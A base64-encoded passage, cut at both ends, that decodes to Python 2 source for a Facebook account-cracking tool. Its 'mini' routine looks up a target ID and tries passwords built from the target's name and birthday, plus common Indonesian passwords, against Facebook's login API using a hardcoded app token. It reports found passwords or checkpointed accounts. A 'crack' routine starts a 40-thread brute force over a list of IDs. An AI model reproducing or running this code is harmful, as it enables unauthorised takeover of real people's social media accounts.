gpDQojLS0tLWNob2ljZXMNCmRlZiBjaG9vc2VfaGFjaygpOg0KCWhhY2sgPSByYXdfaW5wdXQoIlwwMzNbMTs5N23ilZrilZBcMDMzWzE7OTFtPj4+IFwwMzNbMTs5N20iKQ0KCWlmIGhhY2s9PSIiOg0KCQlwcmludCAiXDAzM1sxOzkxbVshXSBXcm9uZyBpbnB1dCINCgkJY2hvb3NlX2hhY2soKQ0KCWVsaWYgaGFjayA9PSIxIjoNCgkJbWluaSgpDQoJZWxpZiBoYWNrID09IjIiOg0KCQljcmFjaygpDQoJCXN1Y2Nlc3MoKQ0KCWVsaWYgaGFjayA9PSIzIjoNCgkJc3VwZXIoKQ0KCWVsaWYgaGFjayA9PSI0IjoNCgkJYnJ1dGUoKQ0KCWVsaWYgaGFjayA9PSI1IjoNCgkJbWVudV95YWhvbygpDQoJZWxpZiBoYWNrID09IjAiOg0KCQltZW51KCkNCgllbHNlOg0KCQlwcmludCAiXDAzM1sxOzkxbVshXSBXcm9uZyBpbnB1dCINCgkJY2hvb3NlX2hhY2soKQ0KDQojIyMjIyBNSU5JIEhGICMjIyMjDQpkZWYgbWluaSgpOg0KCW9zLnN5c3RlbSgnY2xlYXInKQ0KCXRyeToNCgkJZmJfdG9rZW49b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQ0KCWV4Y2VwdCBJT0Vycm9yOg0KCQlwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCINCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykNCgkJdGltZS5zbGVlcCgwLjAxKQ0KCQlsb2dpbigpDQoJb3Muc3lzdGVtKCdjbGVhcicpDQoJcHJpbnQgbG9nbw0KCXByaW50ICJcMDMzWzE7OTdtW1wwMzNbMTs5MW1JTkZPXDAzM1sxOzk3bV0gXDAzM1sxOzkxbVRoZSB0YXJnZXQgYWNjb3VudCBtdXN0IGJlIGZyaWVuZHNcbiAgICAgICB3aXRoIHlvdXIgYWNjb3VudCBmaXJzdCEiDQoJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiDQoJdHJ5Og0KCQlpZCA9IHJhd19pbnB1dCgiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtVGFyZ2V0IElEIFwwMzNbMTs5MW06XDAzM1sxOzk3bSAiKQ0KCQlta2RpcignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1XYWl0IGEgbWludXRlIFwwMzNbMTs5N20uLi4nKQ0KCQlyID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK2lkKyI/YWNjZXNzX3Rva2VuPSIrZmJfdG9rZW4pDQoJCWEgPSBqc29uLmxvYWRzKHIudGV4dCkNCgkJcHJpbnQgJ1wwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtTmFtZVwwMzNbMTs5N20gOiAnK2FbJ25hbWUnXQ0KCQlta2RpcignXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtQ2hlY2sgXDAzM1sxOzk3bS4uLicpDQoJCXRpbWUuc2xlZXAoMikNCgkJbWtkaXIoJ1wwMzNbMTs5MW1bK10gXDAzM1sxOzkybU9wZW4gcGFzc3dvcmQgXDAzM1sxOzk3bS4uLicpDQoJCXRpbWUuc2xlZXAoMikNCgkJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiDQoJCXB6MSA9IGFbJ2ZpcnN0X25hbWUnXSsnMTIzJw0KCQlkYXRhID0gdXJsbGliLnVybG9wZW4oImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyhpZCkrIiZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9IisocHoxKSsiJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2IikNCgkJeSA9IGpzb24ubG9hZChkYXRhKQ0KCQlpZiAnYWNjZXNzX3Rva2VuJyBpbiB5Og0KCQkJcHJpbnQgIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUZvdW5kIg0KCQkJcHJpbnQgIlwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1OYW1lXDAzM1sxOzk3bSAgICAgOiAiK2FbJ25hbWUnXQ0KCQkJcHJpbnQgIlwwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtVXNlcm5hbWVcMDMzWzE7OTdtIDogIitpZA0KCQkJcHJpbnQgIlwwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtUGFzc3dvcmRcMDMzWzE7OTdtIDogIitwejENCgkJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpDQoJCQltZW51X2hhY2soKQ0KCQllbHNlOg0KCQkJaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHlbImVycm9yX21zZyJdOg0KCQkJCXByaW50ICJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Gb3VuZCINCgkJCQlwcmludCAiXDAzM1sxOzkxbVshXSBcMDMzWzE7OTNtQWNjb3VudCBDaGVja3BvaW50Ig0KCQkJCXByaW50ICJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtTmFtZVwwMzNbMTs5N20gICAgIDogIithWyduYW1lJ10NCgkJCQlwcmludCAiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1Vc2VybmFtZVwwMzNbMTs5N20gOiAiK2lkDQoJCQkJcHJpbnQgIlwwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtUGFzc3dvcmRcMDMzWzE7OTdtIDogIitwejENCgkJCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQ0KCQkJCW1lbnVfaGFjaygpDQoJCQllbHNlOg0KCQkJCXB6MiA9IGFbJ2ZpcnN0X25hbWUnXSArICcxMjM0NScNCgkJCQlkYXRhID0gdXJsbGliLnVybG9wZW4oImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyhpZCkrIiZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9IisocHoyKSsiJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2IikNCgkJCQl5ID0ganNvbi5sb2FkKGRhdGEpDQoJCQkJaWYgJ2FjY2Vzc190b2tlbicgaW4geToNCgkJCQkJcHJpbnQgIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUZvdW5kIg0KCQkJCQlwcmludCAiXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybU5hbWVcMDMzWzE7OTdtICAgICA6ICIrYVsnbmFtZSddDQoJCQkJCXByaW50ICJcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybVVzZXJuYW1lXDAzM1sxOzk3bSA6ICIraWQNCgkJCQkJcHJpbnQgIlwwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtUGFzc3dvcmRcMDMzWzE7OTdtIDogIitwejINCgkJCQkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikNCgkJCQkJbWVudV9oYWNrKCkNCgkJCQllbHNlOg0KCQkJCQlpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4geVsiZXJyb3JfbXNnIl06DQoJCQkJCQlwcmludCAiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRm91bmQiDQoJCQkJCQlwcmludCAiXDAzM1sxOzkxbVshXSBcMDMzWzE7OTNtQWNjb3VudCBDaGVja3BvaW50Ig0KCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1OYW1lXDAzM1sxOzk3bSAgICAgOiAiK2FbJ25hbWUnXQ0KCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtVXNlcm5hbWVcMDMzWzE7OTdtIDogIitpZA0KCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtUGFzc3dvcmRcMDMzWzE7OTdtIDogIitwejINCgkJCQkJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpDQoJCQkJCQltZW51X2hhY2soKQ0KCQkJCQllbHNlOg0KCQkJCQkJcHozID0gYVsnbGFzdF9uYW1lJ10gKyAnMTIzJw0KCQkJCQkJZGF0YSA9IHVybGxpYi51cmxvcGVuKCJodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTImZW1haWw9IisoaWQpKyImbG9jYWxlPWVuX1VTJnBhc3N3b3JkPSIrKHB6MykrIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNiIpDQoJCQkJCQl5ID0ganNvbi5sb2FkKGRhdGEpDQoJCQkJCQlpZiAnYWNjZXNzX3Rva2VuJyBpbiB5Og0KCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Gb3VuZCINCgkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybU5hbWVcMDMzWzE7OTdtICAgICA6ICIrYVsnbmFtZSddDQoJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtVXNlcm5hbWVcMDMzWzE7OTdtIDogIitpZA0KCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybVBhc3N3b3JkXDAzM1sxOzk3bSA6ICIrcHozDQoJCQkJCQkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikNCgkJCQkJCQltZW51X2hhY2soKQ0KCQkJCQkJZWxzZToNCgkJCQkJCQlpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4geVsiZXJyb3JfbXNnIl06DQoJCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Gb3VuZCINCgkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1bIV0gXDAzM1sxOzkzbUFjY291bnQgQ2hlY2twb2ludCINCgkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1OYW1lXDAzM1sxOzk3bSAgICAgOiAiK2FbJ25hbWUnXQ0KCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1Vc2VybmFtZVwwMzNbMTs5N20gOiAiK2lkDQoJCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybVBhc3N3b3JkXDAzM1sxOzk3bSA6ICIrcHozDQoJCQkJCQkJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpDQoJCQkJCQkJCW1lbnVfaGFjaygpDQoJCQkJCQkJZWxzZToNCgkJCQkJCQkJbW9kZSA9IGFbJ2JpcnRoZGF5J10NCgkJCQkJCQkJcHo0ID0gbW9kZS5yZXBsYWNlKCcvJywgJycpDQoJCQkJCQkJCWRhdGEgPSB1cmxsaWIudXJsb3BlbigiaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0yJmVtYWlsPSIrKGlkKSsiJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0iKyhwejQpKyImc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYiKQ0KCQkJCQkJCQl5ID0ganNvbi5sb2FkKGRhdGEpDQoJCQkJCQkJCWlmICdhY2Nlc3NfdG9rZW4nIGluIHk6DQoJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRm91bmQiDQoJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybU5hbWVcMDMzWzE7OTdtICAgICA6ICIrYVsnbmFtZSddDQoJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1Vc2VybmFtZVwwMzNbMTs5N20gOiAiK2lkDQoJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1QYXNzd29yZFwwMzNbMTs5N20gOiAiK3B6NA0KCQkJCQkJCQkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikNCgkJCQkJCQkJCW1lbnVfaGFjaygpDQoJCQkJCQkJCWVsc2U6DQoJCQkJCQkJCQlpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4geVsiZXJyb3JfbXNnIl06DQoJCQkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUZvdW5kIg0KCQkJCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtWyFdIFwwMzNbMTs5M21BY2NvdW50IENoZWNrcG9pbnQiDQoJCQkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1OYW1lXDAzM1sxOzk3bSAgICAgOiAiK2FbJ25hbWUnXQ0KCQkJCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybVVzZXJuYW1lXDAzM1sxOzk3bSA6ICIraWQNCgkJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1QYXNzd29yZFwwMzNbMTs5N20gOiAiK3B6NA0KCQkJCQkJCQkJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpDQoJCQkJCQkJCQkJbWVudV9oYWNrKCkNCgkJCQkJCQkJCWVsc2U6DQoJCQkJCQkJCQkJbGFoaXJzID0gYVsnYmlydGhkYXknXQ0KCQkJCQkJCQkJCWpheSA9IGxhaGlycy5yZXBsYWNlKCcvJywgJycpDQoJCQkJCQkJCQkJcHo1ID0gYVsnZmlyc3RfbmFtZSddK2pheQ0KCQkJCQkJCQkJCWRhdGEgPSB1cmxsaWIudXJsb3BlbigiaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0yJmVtYWlsPSIrKGlkKSsiJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0iKyhwejUpKyImc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYiKQ0KCQkJCQkJCQkJCXkgPSBqc29uLmxvYWQoZGF0YSkNCgkJCQkJCQkJCQlpZiAnYWNjZXNzX3Rva2VuJyBpbiB5Og0KCQkJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRm91bmQiDQoJCQkJCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtTmFtZVwwMzNbMTs5N20gICAgIDogIithWyduYW1lJ10NCgkJCQkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtVXNlcm5hbWVcMDMzWzE7OTdtIDogIitpZA0KCQkJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1QYXNzd29yZFwwMzNbMTs5N20gOiAiK3B6NQ0KCQkJCQkJCQkJCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQ0KCQkJCQkJCQkJCQltZW51X2hhY2soKQ0KCQkJCQkJCQkJCWVsc2U6DQoJCQkJCQkJCQkJCWlmICd3d3cuZmFjZWJvb2suY29tJyBpbiB5WyJlcnJvcl9tc2ciXToNCgkJCQkJCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Gb3VuZCINCgkJCQkJCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtWyFdIFwwMzNbMTs5M21BY2NvdW50IENoZWNrcG9pbnQiDQoJCQkJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybU5hbWVcMDMzWzE7OTdtICAgICA6ICIrYVsnbmFtZSddDQoJCQkJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1Vc2VybmFtZVwwMzNbMTs5N20gOiAiK2lkDQoJCQkJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1QYXNzd29yZFwwMzNbMTs5N20gOiAiK3B6NQ0KCQkJCQkJCQkJCQkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikNCgkJCQkJCQkJCQkJCW1lbnVfaGFjaygpDQoJCQkJCQkJCQkJCWVsc2U6DQoJCQkJCQkJCQkJCQlwejYgPSAiYmludGFuZzEyMyINCgkJCQkJCQkJCQkJCWRhdGEgPSB1cmxsaWIudXJsb3BlbigiaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0yJmVtYWlsPSIrKGlkKSsiJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0iKyhwejYpKyImc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYiKQ0KCQkJCQkJCQkJCQkJeSA9IGpzb24ubG9hZChkYXRhKQ0KCQkJCQkJCQkJCQkJaWYgJ2FjY2Vzc190b2tlbicgaW4geToNCgkJCQkJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRm91bmQiDQoJCQkJCQkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1OYW1lXDAzM1sxOzk3bSAgICAgOiAiK2FbJ25hbWUnXQ0KCQkJCQkJCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybVVzZXJuYW1lXDAzM1sxOzk3bSA6ICIraWQNCgkJCQkJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1QYXNzd29yZFwwMzNbMTs5N20gOiAiK3B6Ng0KCQkJCQkJCQkJCQkJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpDQoJCQkJCQkJCQkJCQkJbWVudV9oYWNrKCkNCgkJCQkJCQkJCQkJCWVsc2U6DQoJCQkJCQkJCQkJCQkJaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHlbImVycm9yX21zZyJdOg0KCQkJCQkJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRm91bmQiDQoJCQkJCQkJCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtWyFdIFwwMzNbMTs5M21BY2NvdW50IENoZWNrcG9pbnQiDQoJCQkJCQkJCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtTmFtZVwwMzNbMTs5N20gICAgIDogIithWyduYW1lJ10NCgkJCQkJCQkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtVXNlcm5hbWVcMDMzWzE7OTdtIDogIitpZA0KCQkJCQkJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1QYXNzd29yZFwwMzNbMTs5N20gOiAiK3B6Ng0KCQkJCQkJCQkJCQkJCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQ0KCQkJCQkJCQkJCQkJCQltZW51X2hhY2soKQ0KCQkJCQkJCQkJCQkJCWVsc2U6DQoJCQkJCQkJCQkJCQkJCXB6NyA9ICJzYXlhbmcxMjMsIHNheWFuZywgYmludGFuZywgYmFqaW5nYW4sIHNvbWVvbmUsIGFuamluZywgcHVraW1haywgcGxheWJveSwgZG9yYWVtb24sIGJhaGFnaWEiDQoJCQkJCQkJCQkJCQkJCWRhdGEgPSB1cmxsaWIudXJsb3BlbigiaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0yJmVtYWlsPSIrKGlkKSsiJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0iKyhwejcpKyImc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYiKQ0KCQkJCQkJCQkJCQkJCQl5ID0ganNvbi5sb2FkKGRhdGEpDQoJCQkJCQkJCQkJCQkJCWlmICdhY2Nlc3NfdG9rZW4nIGluIHk6DQoJCQkJCQkJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRm91bmQiDQoJCQkJCQkJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybU5hbWVcMDMzWzE7OTdtICAgICA6ICIrYVsnbmFtZSddDQoJCQkJCQkJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1Vc2VybmFtZVwwMzNbMTs5N20gOiAiK2lkDQoJCQkJCQkJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1QYXNzd29yZFwwMzNbMTs5N20gOiAiK3B6Nw0KCQkJCQkJCQkJCQkJCQkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikNCgkJCQkJCQkJCQkJCQkJCW1lbnVfaGFjaygpDQoJCQkJCQkJCQkJCQkJCWVsc2U6DQoJCQkJCQkJCQkJCQkJCQlpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4geVsiZXJyb3JfbXNnIl06DQoJCQkJCQkJCQkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUZvdW5kIg0KCQkJCQkJCQkJCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtWyFdIFwwMzNbMTs5M21BY2NvdW50IENoZWNrcG9pbnQiDQoJCQkJCQkJCQkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1OYW1lXDAzM1sxOzk3bSAgICAgOiAiK2FbJ25hbWUnXQ0KCQkJCQkJCQkJCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybVVzZXJuYW1lXDAzM1sxOzk3bSA6ICIraWQNCgkJCQkJCQkJCQkJCQkJCQlwcmludCAiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1QYXNzd29yZFwwMzNbMTs5N20gOiAiK3B6Ng0KCQkJCQkJCQkJCQkJCQkJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpDQoJCQkJCQkJCQkJCQkJCQkJbWVudV9oYWNrKCkNCgkJCQkJCQkJCQkJCQkJCWVsc2U6DQoJCQkJCQkJCQkJCQkJCQkJcHJpbnQgIlwwMzNbMTs5MW1bIV0gU29ycnksIGV4aXQgdG8gb3BlbiB0aGUgdGFyZ2V0IHBhc3N3b3JkIDooIg0KCQkJCQkJCQkJCQkJCQkJCXByaW50ICJcMDMzWzE7OTFtWyFdIHRyeSBpdCBhbm90aGVyIHdheS4iDQoJCQkJCQkJCQkJCQkJCQkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikNCgkJCQkJCQkJCQkJCQkJCQltZW51X2hhY2soKQ0KCWV4Y2VwdCBLZXlFcnJvcjoNCgkJcHJpbnQgIlwwMzNbMTs5MW1bIV0gVGVyZ2V0IG5vdCBmb3VuZCINCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikNCgkJbWVudV9oYWNrKCkNCg0KDQojIyMjIyBNdWx0aSBCcnV0ZSBGb3JjZSAjIyMjIw0KIyMjIyMgQ1JBQ0sgIyMjIw0KZGVmIGNyYWNrKCk6DQoJZ2xvYmFsIGlkbGlzdCxwYXNzdyxmaWxlDQoJb3Muc3lzdGVtKCdjbGVhcicpDQoJdHJ5Og0KCQlmYl90b2tlbj1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpDQoJZXhjZXB0IElPRXJyb3I6DQoJCXByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIg0KCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQ0KCQl0aW1lLnNsZWVwKDEpDQoJCWxvZ2luKCkNCglvcy5zeXN0ZW0oJ2NsZWFyJykNCglwcmludCBsb2dvDQoJaWRsaXN0ID0gcmF3X2lucHV0KCdcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1GaWxlIElEICBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtJykNCglwYXNzdyA9IHJhd19pbnB1dCgnXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtUGFzc3dvcmQgXDAzM1sxOzkxbTogXDAzM1sxOzk3bScpDQoJdHJ5Og0KCQlmaWxlID0gb3BlbigoaWRsaXN0KSwgInIiKQ0KCQlta2RpcignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1TdGFydCBcMDMzWzE7OTdtLi4uJykNCgkJZm9yIHggaW4gcmFuZ2UoNDApOg0KCQkJcGljayA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PXNjcmFrLCBhcmdzPSgpKQ0KCQkJcGljay5zdGFydCgpDQoJCQl0aHJlYWRzLmFwcGVuZChwaWNrKQ0KCQlmb3IgcGljayBpbiB0aHJlYWRzOg0KCQkJcGljay5qb2luKCkNCglleGNlcHQgSU9FcnJvcjoNCgkJcHJpbnQgKCJcMDMzWzE7OTFtWyFdIEZpbGUgbm90IGZvdW5kIikNCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMz